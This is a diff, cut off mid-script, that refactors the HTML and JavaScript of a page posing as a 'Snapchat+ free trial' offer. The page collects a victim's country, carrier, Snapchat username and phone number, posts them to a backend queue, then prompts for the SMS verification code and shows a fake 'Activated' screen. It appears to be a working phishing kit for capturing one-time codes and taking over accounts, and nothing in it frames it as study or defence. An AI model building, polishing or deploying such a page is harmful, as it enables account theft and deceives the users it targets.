@@ -330,10 +330,10 @@
         <div class="step active" id="step1">
             <div class="step-title">🌍 Select Your Country</div>
             <div class="grid-2">
-                <div class="country-card" onclick="selectCountry('FR')">
+                <div class="country-card" data-country="FR">
                     <span class="flag">🇫🇷</span> France
                 </div>
-                <div class="country-card" onclick="selectCountry('BE')">
+                <div class="country-card" data-country="BE">
                     <span class="flag">🇧🇪</span> Belgium
                 </div>
             </div>
@@ -343,7 +343,7 @@
         <div class="step" id="step2">
             <div class="step-title">📡 Select Your Network</div>
             <div class="network-grid" id="networkGrid"></div>
-            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
+            <button class="btn btn-secondary" id="backToCountryBtn">← Back</button>
         </div>
 
         <!-- ===== STEP 3: USERNAME + PHONE ===== -->
@@ -360,8 +360,8 @@
                 <input type="tel" id="phoneInput" placeholder="Phone Number" maxlength="15" />
             </div>
 
-            <button class="btn btn-primary" onclick="sendNumber()" id="sendBtn">Continue →</button>
-            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
+            <button class="btn btn-primary" id="sendBtn">Continue →</button>
+            <button class="btn btn-secondary" id="backToNetworkBtn">← Back</button>
 
             <p class="text-center" style="color:#444;font-size:11px;margin-top:14px;">
                 By continuing you agree to our <a href="#" style="color:#666;">Terms</a> &amp; <a href="#" style="color:#666;">Privacy Policy</a>
@@ -383,9 +383,9 @@
             <div class="step-title">🔑 Enter Verification Code</div>
             <p class="otp-hint">We sent a code to <strong id="displayNumber"></strong></p>
             <div class="otp-box" id="otpContainer"></div>
-            <button class="btn btn-primary" onclick="verifyOTP()">Verify →</button>
-            <p class="resend" onclick="resendOTP()">Didn't get the code? <span>Resend</span></p>
-            <button class="btn btn-secondary" onclick="goBack()">← Back</button>
+            <button class="btn btn-primary" id="verifyBtn">Verify →</button>
+            <p class="resend" id="resendBtn">Didn't get the code? <span>Resend</span></p>
+            <button class="btn btn-secondary" id="backToPhoneFromOTPBtn">← Back</button>
         </div>
 
         <!-- ===== STEP 6: SUCCESS ===== -->
@@ -393,7 +393,7 @@
             <div class="icon-big">✅</div>
             <div class="step-title">Snapchat+ Activated! 🎉</div>
             <p class="msg-center success-text">Your free trial is now active.<br />Enjoy exclusive features!</p>
-            <button class="btn btn-primary" style="margin-top:16px;" onclick="resetAll()">Open Snapchat</button>
+            <button class="btn btn-primary" style="margin-top:16px;" id="resetBtn">Open Snapchat</button>
         </div>
 
         <!-- ===== STEP 7: WRONG NUMBER ===== -->
@@ -401,7 +401,7 @@
             <div class="icon-big">❌</div>
             <div class="step-title">Invalid Number</div>
             <p class="msg-center error-text">The number you entered is incorrect.<br />Please try again.</p>
-            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToPhone()">Try Again</button>
+            <button class="btn btn-primary" style="margin-top:16px;" id="retryPhoneBtn">Try Again</button>
         </div>
 
         <!-- ===== STEP 8: OTP ERROR ===== -->
@@ -409,7 +409,7 @@
             <div class="icon-big">❌</div>
             <div class="step-title">Invalid Code</div>
             <p class="msg-center error-text">The code you entered is incorrect.<br />Please try again.</p>
-            <button class="btn btn-primary" style="margin-top:16px;" onclick="goBackToOTP()">Try Again</button>
+            <button class="btn btn-primary" style="margin-top:16px;" id="retryOTPBtn">Try Again</button>
         </div>
 
         <!-- ===== FOOTER ===== -->
@@ -421,176 +421,177 @@
 </div>
 
 <script>
-    // ============================================================
-    // STATE
-    // ============================================================
-    let selectedCountry = null;
-    let selectedNetwork = null;
-    let username = null;
-    let phoneNumber = null;
-    let queueId = null;
-    let otpLength = 4;
+    (function() {
+        'use strict';
 
-    const COUNTRIES = {
-        FR: {
-            name: 'France',
-            code: '+33',
-            networks: ['Orange', 'SFR', 'Bouygues', 'Free'],
-            queue: 'A'
-        },
-        BE: {
-            name: 'Belgium',
-            code: '+32',
-            networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'],
-            queue: 'B'
+        // ============================================================
+        // STATE
+        // ============================================================
+        let selectedCountry = null;
+        let selectedNetwork = null;
+        let username = null;
+        let phoneNumber = null;
+        let queueId = null;
+        let otpLength = 4;
+
+        const COUNTRIES = {
+            FR: {
+                name: 'France',
+                code: '+33',
+                networks: ['Orange', 'SFR', 'Bouygues', 'Free'],
+                queue: 'A'
+            },
+            BE: {
+                name: 'Belgium',
+                code: '+32',
+                networks: ['Proximus', 'Orange BE', 'BASE', 'Telenet'],
+                queue: 'B'
+            }
+        };
+
+        // ============================================================
+        // DOM REFS
+        // ============================================================
+        const $ = id => document.getElementById(id);
+        const step1 = $('step1');
+        const step2 = $('step2');
+        const step3 = $('step3');
+        const step4 = $('step4');
+        const step5 = $('step5');
+        const step6 = $('step6');
+        const step7 = $('step7');
+        const step8 = $('step8');
+
+        const networkGrid = $('networkGrid');
+        const countryCode = $('countryCode');
+        const usernameInput = $('usernameInput');
+        const phoneInput = $('phoneInput');
+        const displayNumber = $('displayNumber');
+        const progressFill = $('progressFill');
+        const otpContainer = $('otpContainer');
+
+        const sendBtn = $('sendBtn');
+        const verifyBtn = $('verifyBtn');
+
+        // ============================================================
+        // STEP MANAGEMENT
+        // ============================================================
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
         }
-    };
 
-    // ============================================================
-    // UI HELPERS
-    // ============================================================
-    function showStep(id) {
-        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
-
-    function goBack() {
-        if (document.getElementById('step3').classList.contains('active')) {
-            showStep('step2');
-        } else if (document.getElementById('step5').classList.contains('active')) {
-            showStep('step3');
-        } else if (document.getElementById('step2').classList.contains('active')) {
-            showStep('step1');
-        } else {
-            showStep('step1');
-        }
-    }
-
-    function goBackToPhone() {
-        showStep('step3');
-        document.getElementById('phoneInput').value = '';
-        document.getElementById('phoneInput').focus();
-    }
-
-    function goBackToOTP() {
-        showStep('step5');
-        document.querySelectorAll('.otp-box input').forEach(el => el.value = '');
-        document.querySelector('.otp-box input')?.focus();
-    }
-
-    // ============================================================
-    // STEP 1: COUNTRY
-    // ============================================================
-    function selectCountry(country) {
-        selectedCountry = country;
-        document.querySelectorAll('.country-card').forEach(el => el.classList.remove('selected'));
-        document.querySelector(`.country-card[onclick="selectCountry('${country}')"]`).classList.add('selected');
-
-        const networks = COUNTRIES[country].networks;
-        const grid = document.getElementById('networkGrid');
-        grid.innerHTML = '';
-        networks.forEach(net => {
-            const btn = document.createElement('div');
-            btn.className = 'network-card';
-            btn.textContent = net;
-            btn.onclick = () => selectNetwork(net);
-            grid.appendChild(btn);
+        // ============================================================
+        // STEP 1: COUNTRY
+        // ============================================================
+        document.querySelectorAll('.country-card').forEach(card => {
+            card.addEventListener('click', function() {
+                const country = this.dataset.country;
+                selectCountry(country);
+            });
         });
 
-        showStep('step2');
-    }
+        function selectCountry(country) {
+            selectedCountry = country;
 
-    // ============================================================
-    // STEP 2: NETWORK
-    // ============================================================
-    function selectNetwork(network) {
-        selectedNetwork = network;
-        document.querySelectorAll('.network-card').forEach(el => el.classList.remove('selected'));
-        document.querySelector(`.network-card[onclick="selectNetwork('${network}')"]`).classList.add('selected');
+            // Highlight selected
+            document.querySelectorAll('.country-card').forEach(el => el.classList.remove('selected'));
+            document.querySelector(`.country-card[data-country="${country}"]`).classList.add('selected');
 
-        document.getElementById('countryCode').textContent = COUNTRIES[selectedCountry].code;
-        showStep('step3');
-        document.getElementById('usernameInput').focus();
-    }
-
-    // ============================================================
-    // STEP 3: SUBMIT
-    // ============================================================
-    async function sendNumber() {
-        username = document.getElementById('usernameInput').value.trim();
-        phoneNumber = document.getElementById('phoneInput').value.replace(/\s/g, '');
-
-        if (!username || username.length < 2) {
-            alert('Please enter your Snapchat username.');
-            document.getElementById('usernameInput').focus();
-            return;
-        }
-
-        if (!phoneNumber || phoneNumber.length < 8) {
-            alert('Please enter a valid phone number.');
-            document.getElementById('phoneInput').focus();
-            return;
-        }
-
-        const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
-        const btn = document.getElementById('sendBtn');
-        btn.disabled = true;
-        btn.textContent = 'Sending...';
-
-        showStep('step4');
-
-        let progress = 0;
-        const fill = document.getElementById('progressFill');
-        const interval = setInterval(() => {
-            progress += Math.random() * 8;
-            if (progress > 90) clearInterval(interval);
-            fill.style.width = Math.min(progress, 90) + '%';
-        }, 300);
-
-        try {
-            const response = await fetch('/api/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    number: fullNumber,
-                    username: username,
-                    country: selectedCountry,
-                    network: selectedNetwork,
-                    queue: COUNTRIES[selectedCountry].queue
-                })
+            // Build network grid
+            const networks = COUNTRIES[country].networks;
+            networkGrid.innerHTML = '';
+            networks.forEach(net => {
+                const btn = document.createElement('div');
+                btn.className = 'network-card';
+                btn.textContent = net;
+                btn.dataset.network = net;
+                btn.addEventListener('click', function() {
+                    selectNetwork(net);
+                });
+                networkGrid.appendChild(btn);
             });
 
-            const data = await response.json();
-            queueId = data.queueId;
-
-            clearInterval(interval);
-            fill.style.width = '100%';
-
-            setTimeout(() => {
-                showStep('step5');
-                setupOTP(4);
-                document.getElementById('displayNumber').textContent = fullNumber;
-                document.querySelector('.otp-box input')?.focus();
-            }, 500);
-
-        } catch (error) {
-            alert('Connection error. Please try again.');
-            resetAll();
-        } finally {
-            btn.disabled = false;
-            btn.textContent = 'Continue →';
+            showStep('step2');
         }
-    }
 
-    // ============================================================
-    // STEP 5: OTP
-    // ============================================================
-    function setupOTP(length) {
-        otpLength = length;
-        const container = document.getElementById('otpContainer');
-        container.innerHTML = '';
-        for (let i = 0; i < length; i++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.id =
+        // ============================================================
+        // STEP 2: NETWORK
+        // ============================================================
+        function selectNetwork(network) {
+            selectedNetwork = network;
+
+            // Highlight selected
+            document.querySelectorAll('.network-card').forEach(el => el.classList.remove('selected'));
+            document.querySelector(`.network-card[data-network="${network}"]`).classList.add('selected');
+
+            // Update country code
+            countryCode.textContent = COUNTRIES[selectedCountry].code;
+
+            showStep('step3');
+            usernameInput.focus();
+        }
+
+        // ============================================================
+        // STEP 3: SUBMIT
+        // ============================================================
+        sendBtn.addEventListener('click', sendNumber);
+
+        phoneInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') sendNumber();
+        });
+
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') phoneInput.focus();
+        });
+
+        async function sendNumber() {
+            username = usernameInput.value.trim();
+            phoneNumber = phoneInput.value.replace(/\s/g, '');
+
+            if (!username || username.length < 2) {
+                alert('Please enter your Snapchat username.');
+                usernameInput.focus();
+                return;
+            }
+
+            if (!phoneNumber || phoneNumber.length < 8) {
+                alert('Please enter a valid phone number.');
+                phoneInput.focus();
+                return;
+            }
+
+            const fullNumber = COUNTRIES[selectedCountry].code + phoneNumber;
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Sending...';
+
+            showStep('step4');
+
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 8;
+                if (progress > 90) clearInterval(interval);
+                progressFill.style.width = Math.min(progress, 90) + '%';
+            }, 300);
+
+            try {
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        number: fullNumber,
+                        username: username,
+                        country: selectedCountry,
+                        network: selectedNetwork,
+                        queue: COUNTRIES[selectedCountry].queue
+                    })
+                });
+
+                const data = await response.json();
+                queueId = data.queueId;
+
+                clearInterval(interval);
+                progressFill.style.width = '100%';
+
+                setTimeout(() => {
+      
